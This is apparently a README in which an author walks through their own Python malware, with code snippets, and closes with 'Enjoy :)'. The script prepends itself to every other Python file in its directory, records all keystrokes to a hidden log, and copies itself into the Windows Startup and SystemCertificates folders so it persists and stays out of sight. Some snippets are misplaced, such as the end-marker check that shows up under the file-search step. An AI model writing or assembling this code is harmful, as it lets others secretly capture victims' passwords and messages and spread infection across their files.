You need pynput for this to run, if you do not have it installed, run: `pip install pynput`


Hereâ€™s a detailed breakdown of what my code does, step by step:

1. `Virus Structure Definition`
The script starts by defining the sections of the code that represent the "Virus":
```python
# Virus Beginning
# ...
# Virus End
```
The code that lies between these markers is the part that will replicate itself into other Python files.

2. `Reading Itself`
The code reads its own file to identify and extract the "Virus" portion:
```python
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
```
This reads the entire script into memory, line by line.


3. `Extracting Virus Code`
The script uses a loop to determine which lines belong to the "Virus":
```python
virus_area = False
for line in lines:
    if line == '# Virus Beginning\n':
        virus_area = True
    if virus_area:
        code.append(line)
```
It sets a flag when it finds the beginning of the virus code and appends all subsequent lines until it finds the end marker.

4. `Finding Other Python Scripts`
The script uses the glob module to identify other Python scripts in the current directory:
```python
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

    if line == '# Virus End\n':
        break
```
This creates a list of all .py and .pyw files in the same directory.

5. `Checking for Infections`
For each Python script found, the code checks if it is already infected by looking for the virus markers:
```python
for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()
    infected = False
    for line in script_code:
        if line == '# Virus Beginning\n':
            infected = True
            break
```
If the script contains # Virus Beginning, it is marked as infected.

6. `Inserting the Virus Code`
If a script is not already infected, the code appends the extracted virus code to it:
```python
if not infected:
    final_code = []
    final_code.extend(code)
    final_code.append('\n')
    final_code.extend(script_code)

    with open(script, 'w') as f:
        f.writelines(final_code)

```
The new file is rewritten to include the virus code at the top.

7. `Keylogging Setup`
The script sets up a keylogger using the pynput library:
```python
from pynput.keyboard import Listener
```
This allows it to monitor and log keystrokes.

8. `Logging Configuration`
The script configures a logging system to log keystrokes:
```python
username = os.getlogin()
logging_directory = f"/Users/{username}/Desktop"
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
```
It creates a log file named mylog.txt on the user's Desktop, where it will record the keystrokes.

9. `Key Handler Function`
The function key_handler is defined to log the keystrokes:
```python
def key_handler(key):
    logging.info(key)
```

10. `Starting the Keylogger`
Finally, the keylogger starts listening for keystrokes:
```python
with Listener(on_press=key_handler) as listener:
    listener.join()
```
The listener runs in the background, logging every key pressed until the program is terminated.

11. `Self-Copying`
Additionally, the script copies itself into the Windows Startup folder AND the SystemCertificates folder:
```python
copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')
copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/SystemCertificates/My/main.py')
```
This ensures that the script runs automatically each time the user logs into their account, and that it's also hidden in system files

`Summary`
In essence, this script is designed to:
Replicate itself into other Python scripts within its directory.
Log keystrokes to a text file.
Copy itself to the Windows Startup folder and System Certificates folder for persistence.


Enjoy :)
